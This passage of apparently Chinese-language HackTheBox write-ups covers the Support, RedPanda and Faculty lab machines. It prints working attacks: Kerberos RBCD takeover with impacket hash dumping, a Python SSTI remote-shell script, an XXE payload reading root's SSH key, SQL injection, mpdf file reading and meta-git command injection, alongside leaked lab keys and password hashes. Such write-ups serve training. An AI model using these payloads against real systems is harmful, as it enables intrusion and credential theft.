SYSVOL Disk Logon server share support-toolssupport-tools里可以得到一些文件： 123456789101112131415└─$ smbclient //10.10.11.174/support-tools -NTry \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Thu Jul 21 01:01:06 2022 .. D 0 Sat May 28 19:18:25 2022 7-ZipPortable_21.07.paf.exe A 2880728 Sat May 28 19:19:19 2022 npp.8.4.1.portable.x64.zip A 5439245 Sat May 28 19:19:55 2022 putty.exe A 1273576 Sat May 28 19:20:06 2022 SysinternalsSuite.zip A 48102161 Sat May 28 19:19:31 2022 UserInfo.exe.zip A 277499 Thu Jul 21 01:01:07 2022 windirstat1_1_2_setup.exe A 79171 Sat May 28 19:20:17 2022 WiresharkPortable64_3.6.5.paf.exe A 44398000 Sat May 28 19:19:43 2022 4026367 blocks of size 4096. 871743 blocks availablesmb: \\&gt; UserInfo下载 UserInfo.exe.zip，.net exe,直接dnspy反编译发现是使用ldap查询用户信息用的，有个加密的密码,就是简单的异或： 解密得到密码： 1234567891011❯ python3Python 3.10.0 on linux&gt;&gt;&gt; enc_password = b\"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"&gt;&gt;&gt; key = b\"armando\"&gt;&gt;&gt; import base64&gt;&gt;&gt; array = base64.b64decode(enc_password)&gt;&gt;&gt; array2 = []&gt;&gt;&gt; for i in range(len(array)):... array2.append(chr(array[i] ^ key[i % len(key)] ^ 223))&gt;&gt;&gt; print(\"\".join(array2))nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz ldap根据ldap query，去通过ldap获取信息： info里得到一个默认密码： 123ldapsearch -D support\\\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep info:info: Ironside47pleasure40Watchful 同样ldap获取所有用户名，密码喷洒，得到一个有效账号： 12345ldapsearch -D support\\\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep name: | sed 's/^name: //' | grep -vE 'D|C|A|U' &gt; users.txtcrackmapexec winrm 10.10.11.174 -u users.txt -p Ironside47pleasure40WatchfulWINRM 10.10.11.174 5985 DC [+] support.htb\\support:Ironside47pleasure40Watchful (Pwn3d!) user flag得到的账号密码登录，得到user flag 提权信息运行bloodhound，发现support用户在shared support组中，对DC有GenericAll权限 123bloodhound-python -u support -ns 10.10.11.174 -d support.htb -c All# 从已有的support开始，分析里查看Group Delegated Object Control，得到这个结果 这种情况，可以通过RBCD进行： Kerberos Resource-based Constrained Delegation: Computer Object Takeover - Red Teaming Experimentshttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution RBCD 使用powerview和powermad，上传导入模块后一步步： 123456789101112131415161718Import-Module .\\PowerView.ps1Import-Module .\\Powermad.ps1# 新建一个机器账户New-MachineAccount -MachineAccount miao01 -Password $(ConvertTo-SecureString 'miao123456' -AsPlainText -Force) -Verbose# 获取我们创建的账户的sidGet-DomainComputer miao01 -Properties objectsidS-1-5-21-1677581083-3380853377-188903654-5102$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5102)\"$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)# 修改目标机器安全描述符Get-DomainComputer dc | Set-DomainObject -Set @&#123;'msds-allowedtoactonbehalfofotheridentity'=$SDBytes&#125;# 获取票据impacket-getST support.htb/miao01:miao123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb root flag使用得到的票据登录，root flag： 123export KRB5CCNAME=administrator.ccacheimpacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k secretdump123456789101112131415161718192021222324252627282930$ python3 ~/Tools/impacket/examples/secretsdump.py support.htb/administrator@dc.support.htb -just-dc-ntlm -no-pass -kImpacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::smith.rosario:1106:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::hernandez.stanley:1107:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::wilson.shelby:1108:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::anderson.damian:1109:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::thomas.raphael:1110:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::levine.leopoldo:1111:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::raven.clifton:1112:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::bardot.mary:1113:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::cromwell.gerard:1114:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::monroe.david:1115:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::west.laura:1116:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::langley.lucy:1117:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::daughtler.mabel:1118:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::stoll.rachelle:1119:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::ford.victoria:1120:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::DC$:1000:aad3b435b51404eeaad3b435b51404ee:4c3ab1a0eed84c759a7fc9b18dd8a865:::MANAGEMENT$:2601:aad3b435b51404eeaad3b435b51404ee:3f99f2f26988d1f348d378e84f86bc58:::attackersystem$:5101:aad3b435b51404eeaad3b435b51404ee:ef266c6b963c0bb683941032008ad47f:::miao01$:5102:aad3b435b51404eeaad3b435b51404ee:5cfc31356a652662201e5072ec5dfd25:::[*] Cleaning up... 参考资料 Kerberos Resource-based Constrained Delegation: Computer Object Takeover - Red Teaming Experimentshttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution Support - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Support-HTB-Discussion Writeup Support HackTheBoxhttps://gatogamer1155.github.io/hackthebox/support/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"RedPanda - HackTheBox","slug":"RedPanda-HackTheBox","date":"2022-07-19T05:11:42.000Z","updated":"2022-11-28T07:42:38.085Z","comments":true,"path":"2022/07/19/RedPanda-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/07/19/RedPanda-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/481 10.10.11.170 端口扫描22和8080: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105$ nmap -sC -sV 10.10.11.170Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 10:34 CSTNmap scan report for 10.10.11.170Host is up (0.19s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)8080/tcp open http-proxy|_http-open-proxy: Proxy might be redirecting requests| fingerprint-strings:| GetRequest:| HTTP/1.1 200| Content-Type: text/html;charset=UTF-8| Content-Language: en-US| Date: Tue, 19 Jul 2022 02:35:51 GMT| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en\" dir=\"ltr\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;meta author=\"wooden_k\"&gt;| &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;| &lt;link rel=\"stylesheet\" href=\"css/panda.css\" type=\"text/css\"&gt;| &lt;link rel=\"stylesheet\" href=\"css/main.css\" type=\"text/css\"&gt;| &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;div class='pande'&gt;| &lt;div class='ear left'&gt;&lt;/div&gt;| &lt;div class='ear right'&gt;&lt;/div&gt;| &lt;div class='whiskers left'&gt;| &lt;span&gt;&lt;/span&gt;| &lt;span&gt;&lt;/span&gt;| &lt;span&gt;&lt;/span&gt;| &lt;/div&gt;| &lt;div class='whiskers right'&gt;| &lt;span&gt;&lt;/span&gt;| &lt;span&gt;&lt;/span&gt;| &lt;span&gt;&lt;/span&gt;| &lt;/div&gt;| &lt;div class='face'&gt;| &lt;div class='eye| HTTPOptions:| HTTP/1.1 200| Allow: GET,HEAD,OPTIONS| Content-Length: 0| Date: Tue, 19 Jul 2022 02:35:51 GMT| Connection: close| RTSPRequest:| HTTP/1.1 400| Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 435| Date: Tue, 19 Jul 2022 02:35:51 GMT| Connection: close| &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400| Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400|_ Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;|_http-title: Red Panda Search | Made with Spring Boot1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8080-TCP:V=7.92%I=7%D=7/19%Time=62D61887%P=x86_64-apple-darwin20.4.SF:0%r(GetRequest,690,\"HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;SF:charset=UTF-8\\r\\nContent-Language:\\x20en-US\\r\\nDate:\\x20Tue,\\x2019\\x20JSF:ul\\x202022\\x2002:35:51\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\SF:x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"\\x20dir=\\\"ltr\\\"&gt;\\n\\x20\\x20&lt;head&gt;\\n\\x20\\x2SF:0\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20author=\\SF:\"wooden_k\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;!--Codepen\\x20by\\x20khr2003:\\x20https://SF:codepen\\.io/khr2003/pen/BGZdXw\\x20--&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"sSF:tylesheet\\\"\\x20href=\\\"css/panda\\.css\\\"\\x20type=\\\"text/css\\\"&gt;\\n\\x20\\x20\\SF:x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/main\\.css\\\"\\x20type=\\\"SF:text/css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;Red\\x20Panda\\x20Search\\x20\\|\\x20MadSF:e\\x20with\\x20Spring\\x20Boot&lt;/title&gt;\\n\\x20\\x20&lt;/head&gt;\\n\\x20\\x20&lt;body&gt;\\n\\SF:n\\x20\\x20\\x20\\x20&lt;div\\x20class='pande'&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\xSF:20class='ear\\x20left'&gt;&lt;/div&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class='eaSF:r\\x20right'&gt;&lt;/div&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class='whiskers\\x20SF:left'&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20SF:\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;/div&gt;\\n\\x20\\x20SF:\\x20\\x20\\x20\\x20&lt;div\\x20class='whiskers\\x20right'&gt;\\n\\x20\\x20\\x20\\x20\\x2SF:0\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/spaSF:n&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20SF:\\x20&lt;/div&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class='face'&gt;\\n\\x20\\x20\\x20SF:\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class='eye\")%r(HTTPOptions,75,\"HTTP/1\\.1\\x2SF:0200\\x20\\r\\nAllow:\\x20GET,HEAD,OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:SF:\\x20Tue,\\x2019\\x20Jul\\x202022\\x2002:35:51\\x20GMT\\r\\nConnection:\\x20closSF:e\\r\\n\\r\\n\")%r(RTSPRequest,24E,\"HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x2SF:0text/html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\SF:x20435\\r\\nDate:\\x20Tue,\\x2019\\x20Jul\\x202022\\x2002:35:51\\x20GMT\\r\\nConnSF:ection:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;&lt;html\\x20lang=\\\"en\\\"&gt;&lt;head&gt;&lt;tSF:itle&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request&lt;/title&gt;&lt;stSF:yle\\x20type=\\\"text/css\\\"&gt;body\\x20&#123;font-family:Tahoma,Arial,sans-serif;&#125;SF:\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20&#123;color:white;background-color:#525D76;&#125;\\xSF:20h1\\x20&#123;font-size:22px;&#125;\\x20h2\\x20&#123;font-size:16px;&#125;\\x20h3\\x20&#123;font-sizSF:e:14px;&#125;\\x20p\\x20&#123;font-size:12px;&#125;\\x20a\\x20&#123;color:black;&#125;\\x20\\.line\\x20SF:&#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;SF:&lt;h1&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request&lt;/h1&gt;&lt;/body&gt;SF:&lt;/html&gt;\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 81.95 seconds 8080一个搜索功能，spring boot： SSTIburp之类扫描会提示用到模板，java的SSTI，过滤了 $,可以使用其他符号： Thymeleaf SSTI analysis of Java Securityhttps://javamana.com/2021/11/20211121071046977B.html 后续就是一步步： VikasVarshney/ssti-payload: SSTI Payload Generatorhttps://github.com/VikasVarshney/ssti-payload ssti_exp.py123456789101112131415161718192021222324252627282930313233#!/usr/bin/python3import requestsfrom cmd import Cmdfrom bs4 import BeautifulSoupclass RCE(Cmd): prompt = \"\\033[1;31m$\\033[1;37m \" def decimal(self, args): comando = args decimales = [] for i in comando: decimales.append(str(ord(i))) payload = \"*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)\" % decimales[0] for i in decimales[1:]: payload += \".concat(T(java.lang.Character).toString(&#123;&#125;))\".format(i) payload += \").getInputStream())&#125;\" data = &#123; \"name\": payload &#125; requer = requests.post(\"http://10.10.11.170:8080/search\", data=data) parser = BeautifulSoup(requer.content, 'html.parser') grepcm = parser.find_all(\"h2\")[0].get_text() result = grepcm.replace('You searched for:','').strip() print(result) def default(self, args): try: self.decimal(args) except: print(\"%s: command not found\" % (args))RCE().cmdloop() user flagSSTI执行命令，得到user： 提权信息代码文件中得到账号密码，ssh方便后续操作： 123cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.javaconn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/red_panda\", \"woodenk\", \"RedPandazRule\"); 运行pspy64，发现root定期操作，删除特定后缀文件： 在之前的MainController.java中可以看到export.xml 相关代码,涉及到元数据判断： 123456789101112131415@GetMapping(value=\"/export.xml\", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE) public @ResponseBody byte[] exportXML(@RequestParam(name=\"author\", defaultValue=\"err\") String author) throws IOException &#123; System.out.println(\"Exporting xml of: \" + author); if(author.equals(\"woodenk\") || author.equals(\"damian\")) &#123; InputStream in = new FileInputStream(\"/credits/\" + author + \"_creds.xml\"); System.out.println(in); return IOUtils.toByteArray(in); &#125; else &#123; return IOUtils.toByteArray(\"Error, incorrect paramenter 'author'\\n\\r\"); &#125; &#125; 另外App.java中/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java 中，可以看到处理元数据的逻辑： 123456789101112131415161718public static String getArtist(String uri) throws IOException, JpegProcessingException &#123; String fullpath = \"/opt/panda_search/src/main/resources/static\" + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) &#123; for(Tag tag : dir.getTags()) &#123; if(tag.getTagName() == \"Artist\") &#123; return tag.getDescription(); &#125; &#125; &#125; return \"N/A\"; &#125; useragent parselog部分： 123456789public static Map parseLog(String line) &#123; String[] strings = line.split( Map map = new HashMap&lt;&gt;(); map.put(\"status_code\", Integer.parseInt(strings[ map.put(\"ip\", strings[1]); map.put(\"user_agent\", strings[2]); map.put(\"uri\", strings[3]); return map;&#125; 提权部分完全不是easy级别，大概流程就是exportxml，元数据用户名，xml XXE 提权任意一张图片，修改Artist元数据，传上去： 123456$ exiftool -Artist='../home/woodenk/miao' miao.jpg 1 image files updated$ scp miao.jpg woodenk@10.10.11.170:.woodenk@10.10.11.170's password:miao.jpg 100% 144KB 183.8KB/s 00:00 XXE的xml文件： 1234567891011121314woodenk@redpanda:~$ pwd/home/woodenkwoodenk@redpanda:~$ cat miao_creds.xml&lt;!--?xml version=\"1.0\" ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM \"file:///root/.ssh/id_rsa\"&gt; ]&gt;&lt;credits&gt; &lt;author&gt;damian&lt;/author&gt; &lt;image&gt; &lt;uri&gt;/../../../../../../../home/woodenk/miao.jpg&lt;/uri&gt; &lt;hello&gt;&amp;ent;&lt;/hello&gt; &lt;views&gt;0&lt;/views&gt; &lt;/image&gt; &lt;totalviews&gt;0&lt;/totalviews&gt;&lt;/credits&gt; 然后发起一个请求,useragent注入uri： 1curl http://10.10.11.170:8080 -H \"User-Agent: ||/../../../../../../../home/woodenk/miao.jpg\" 访问stats执行export xml： 然后再去查看我们的XXE xml,已经得到了我们指定读取文件的内容： root_id_rsa1234567-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJRwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE&#x3D;-----END OPENSSH PRIVATE KEY----- root flag使用得到的root私钥登录，root： shadow12root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL&#x2F;l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::woodenk:$6$48BoRAl2LvBK8Zth$vpJzroFTUyQRA&#x2F;UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu&#x2F;hSEZTTT8EFbGKNIbT3e2ox3qqK&#x2F;MJRJIJ1:19157:0:99999:7::: 参考资料 Thymeleaf SSTI analysis of Java Securityhttps://javamana.com/2021/11/20211121071046977B.html PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThingshttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java VikasVarshney/ssti-payload: SSTI Payload Generatorhttps://github.com/VikasVarshney/ssti-payload RedPanda - HTB [Discussion] | BreachForumshttps://breached.to/Thread-RedPanda-HTB-Discussion--13718 Writeup RedPanda HackTheBoxhttps://gatogamer1155.github.io/hackthebox/redpanda/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Faculty - HackTheBox","slug":"Faculty-HackTheBox","date":"2022-07-09T05:15:33.000Z","updated":"2022-10-24T00:31:16.048Z","comments":true,"path":"2022/07/09/Faculty-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/07/09/Faculty-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/480 10.10.11.169 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.169Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-09 11:58 CSTNmap scan report for 10.10.11.169Host is up (0.36s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)| 256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)|_ 256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://faculty.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 172.84 seconds 80需要加host： 110.10.11.169 faculty.htb admin直接查看源码或者扫描目录可以发现admin目录： sql注入基础sql注入： 1admin&#39; or 1&#x3D;1 # pdf页面上存在下载pdf的功能,发现是两次url，一次base64编码的内容使用mpdf生成的pdf文件： mpdf LFI搜索可以找到利用mpdf读取文件的方式： Make annotation tags disabled by default · Issue #356 · mpdf/mpdfhttps://github.com/mpdf/mpdf/issues/356 利用这个方式去生成新pdf读文件， 读取的文件在生成的pdf文件的附件中，firefox可以直接看到然后下载： 123456789https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&amp;input=PGFubm90YXRpb24gZmlsZT0iL2V0Yy9wYXNzd2QiIGNvbnRlbnQ9Ii9ldGMvcGFzc3dkIiBpY29uPSJHcmFwaCIgdGl0bGU9IkF0dGFjaGVkIEZpbGU6IC9ldGMvcGFzc3dkIiBwb3MteD0iMTk1IiAvPgcurl http://faculty.htb/mpdf/tmp/OK5zAnWj3DI9qFyfX0ixEwMC7h.pdf --output 1.pdf$ cat passwd | grep shroot:x:0:0:root:/root:/bin/bashsshd:x:111:65534::/run/sshd:/usr/sbin/nologingbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bashdeveloper:x:1001:1002:,,,:/home/developer:/bin/bash 后续就是一步步读文件： 根据报错信息获取到php文件名和路径，去读取源码，一步步继续，最终得到密码： 12345&#x2F;var&#x2F;www&#x2F;scheduling&#x2F;admin&#x2F;admin_class.phpinclude &#39;db_connect.php&#39;;&lt;?php$conn&#x3D; new mysqli(&#39;localhost&#39;,&#39;sched&#39;,&#39;Co.met06aci.dly53ro.per&#39;,&#39;scheduling_db&#39;)or die(&quot;Could not connect to mysql&quot;.mysqli_error($con)); gbyolo得到的密码可以ssh登录gbyolo用户,下一步是通过meta-git到developer： 12ssh gbyolo@10.10.11.169Co.met06aci.dly53ro.per 搜索可以发现相关漏洞： 728040 [meta-git] RCE via insecure command formatting https://hackerone.com/reports/728040 读取developer的私钥： 12sudo -u developer meta-git clone &#39;miao || whoami&#39;sudo -u developer meta-git clone &#39;miao || cat ~&#x2F;.ssh&#x2F;id_rsa&#39; developer_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329&#x2F;&#x2F;sdapn4ncVzRYZxACC&#x2F;czxmSO5Us2S87dxywizZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp&#x2F;zBy0pVK6H7g6GMAVSpribX&#x2F;DrdHCcmsIu7WqkyZ0mDN2sS+3uMk6I3361x2ztAG1aC9xJX7EJsHmXDRLZ8G1RibKpI0WqAWNSXHDDvcwDpmWDk+NlIRKkpGcVByzhG8x1azvKWS9G36zeLLARBP43ax4eAVrsAd+7ig3vl9Iv+ZtRzkH0PsMhriIlHBNUy9dFAGP5aa4ZUkYHi1&#x2F;MlBnsWOgiRHMgcJzcWXOGeIJbtcdp2aBOjZlGJ+G6uLWrxwlX9anM3gPXTT4DGqZV1Qp&#x2F;3+JZF19&#x2F;KXJ1dr0i328jsaMlzDijF5bZjpAOcLxS0V84t99R&#x2F;7bRbLdFxME&#x2F;0xyb6QMKcMDnLrDUmdhiObROZFl3v5hnsW9CoFLiKE&#x2F;4jWKP6lPU+31GOTpKtLXYMDbcepAAAFiOUui47lLouOAAAAB3NzaC1yc2EAAAGBAMQwIKx3A9iOFN9vf&#x2F;7HWqZ+J3Fc0WGcQAgv3M8ZkjuVLNkvO3ccsIs2dIQ7Mx8pPmwgeQdcL67ZgBbtijeGhgqACTDRplaHAZyJEnMxqf8wctKVSuh+4OhjAFUqa4m1&#x2F;w63RwnJrCLu1qpMmdJgzdrEvt7jJOiN9+tcds7QBtWgvcSV+xCbB5lw0S2fBtUYmyqSNFqgFjUlxww73MA6Zlg5PjZSESpKRnFQcs4RvMdWs7ylkvRt+s3iywEQT+N2seHgFa7AHfu4oN75fSL&#x2F;mbUc5B9D7DIa4iJRwTVMvXRQBj+WmuGVJGB4tfzJQZ7FjoIkRzIHCc3FlzhniCW7XHadmgTo2ZRifhuri1q8cJV&#x2F;WpzN4D100+AxqmVdUKf9&#x2F;iWRdffylydXa9It9vI7GjJcw4oxeW2Y6QDnC8UtFfOLffUf+20Wy3RcTBP9Mcm+kDCnDA5y6w1JnYYjm0TmRZd7+YZ7FvQqBS4ihP+I1ij+pT1Pt9Rjk6SrS12DA23HqQAAAAMBAAEAAAGBAIjXSPMC0Jvr&#x2F;oMaspxzULdwpvJbW3BKHB+Zwtpxa55DntSeLUwXpsxzXzIcWLwTeIbS35hSpK&#x2F;A5acYaJ&#x2F;yJOyOAdsbYHpaELWupj&#x2F;TFE&#x2F;66xwXJfilBxsQctr0i62yVAVfsR0Sng5&#x2F;qRt&#x2F;8orbGrrNIJU2uje7ToHMLNJ0J1A6niLQuh4LBHHyTvUTRyC72P8Im5varaLEhuHxnzg1g81loA8jjvWAeUHwayNxG8uung+nLalwTM&#x2F;usMo9Jnvx&#x2F;UeoKnKQ4r5AunVeM7QQTdEZtwMk2G4vOZ9ODQztJO7aCDCiEvHx9U9A6HNyDEMfCebfsJ9voa6i+rphRzK9or&#x2F;+IbjH3JlnQOZw8JRC1RpI&#x2F;uTECivtmkp4ZrFF5YAo9ie7ctB2JIujPGXlv&#x2F;F8Ue9FGN6W4XW7b+HfnG5VjCKYKyrqk&#x2F;yxMmg6w2Y5P5N&#x2F;NvWYyoIZPQgXKUlTzYj984plSl2+k9Tca27aahZOSLUceZqq71aXyfKPGWoITp5dAQAAAMEAl5stT0pZ0iZLcYi+b&#x2F;7ZAiGTQwWYS0p4Glxm204DedrOD4c&#x2F;Aw7YZFZLYDlL2KUk6o0M2X9joquMFMHUoXB7DATWknBS7xQcCf